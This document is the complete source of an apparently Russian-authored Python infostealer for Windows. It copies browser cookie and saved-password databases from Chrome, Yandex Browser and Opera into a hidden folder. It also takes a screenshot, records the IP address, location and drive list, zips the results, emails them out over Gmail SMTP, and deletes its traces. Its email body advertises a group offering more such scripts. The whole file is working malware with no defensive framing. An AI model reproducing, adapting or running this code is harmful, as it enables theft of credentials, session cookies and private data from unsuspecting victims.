import getpass
import os
import shutil
import subprocess
import zipfile
import sys
import time
import win32api
import platform
import requests
import ip2geotools
import smtplib
from PIL import ImageGrab
from ip2geotools.databases.noncommercial import DbIpCity
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

user = getpass.getuser()

sender = ""
receiver = ""
password = ""

try:
    os.mkdir("files")
    subprocess.call(['attrib', '+h', "files"])
    os.mkdir("files/results")

    ChromeCookie = rf'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
    ChromePass = rf'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
    YandexCookie = rf'C:\\Users\\{user}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'
    YandexPass = rf'C:\\Users\\{user}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker'
    OperaCookie = rf'C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies'
    OperaPass = rf'C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
    Screen = rf'C:\\Users\\{user}\\AppData\\Roaming\\{user}-sreenshot.jpg'

    if (os.path.exists(ChromeCookie)) == True:
        os.mkdir("files/results/Chrome")
        shutil.copyfile(ChromeCookie, "files/results/Chrome/Google Chrome Cookie", follow_symlinks=True)

    if (os.path.exists(ChromePass)) == True:
        if not os.path.exists('files/results/Chrome'):
            os.mkdir("files/results/Chrome")
        shutil.copyfile(ChromePass, "files/results/Chrome/Google Chrome Passwords", follow_symlinks=True)

    if (os.path.exists(YandexCookie)) == True:
        os.mkdir("files/results/Yandex")
        shutil.copyfile(YandexCookie, "files/results/Yandex/Yandex Browser cookie", follow_symlinks=True)

    if (os.path.exists(YandexPass)) == True:
        if not os.path.exists("files/results/Yandex"):
            os.mkdir("files/results/Yandex")
        shutil.copyfile(YandexPass, "files/results/Yandex/Yandex Browser passwords", follow_symlinks=True)

    if (os.path.exists(OperaCookie)) == True:
        os.mkdir("files/results/Opera")
        shutil.copyfile(OperaCookie, "files/results/Opera/Opera Cookie", follow_symlinks=True)

    if (os.path.exists(OperaPass)) == True:
        if not os.path.exists("files/results/Opera"):
            os.mkdir("files/results/Opera")
        shutil.copyfile(OperaPass, "files/results/Opera/Opera Passwords", follow_symlinks=True)

    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + rf'\\{user}-sreenshot.jpg')
    if (os.path.exists(Screen)) == True:
        os.mkdir("files/results/Screen")
        shutil.copyfile(Screen, rf"files/results/Screen/{user}-sreenshot.jpg", follow_symlinks=True)

    d = str(win32api.GetLogicalDriveStrings())
    d = str(d.split('\000')[:-1])
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
    data = "Время: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: ' + requests.get(
        "https://ramziv.com/ip").text + '\nГород: ' + response.city + '\nGen_Location:' + response.to_json() + '\nДиски:' + d
    os.mkdir("files/results/Info")
    file = open(rf"files/results/Info/{user}-info.txt", "w")
    file.write(data)
    file.close()

    z = zipfile.ZipFile(f'files/{user}.zip', 'w')
    for root, dirs, files in os.walk('files/results'):
        for dir in dirs:
            z.write(os.path.join(root, dir))
        for file in files:
            z.write(os.path.join(root, file))
    z.close()

    subject = rf"Результаты парсинга {user}"
    body = "Больше скриптов здесь - vk.com/club194891560"

    message = MIMEMultipart()
    message["From"] = sender
    message["To"] = receiver
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    filename = rf"files/{user}.zip"

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header("Content-Disposition", f"attachment; filename= {filename}", )

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender, password)
        server.sendmail(sender, receiver, text)

    shutil.rmtree('files')
except Exception as e:
    print(repr(e))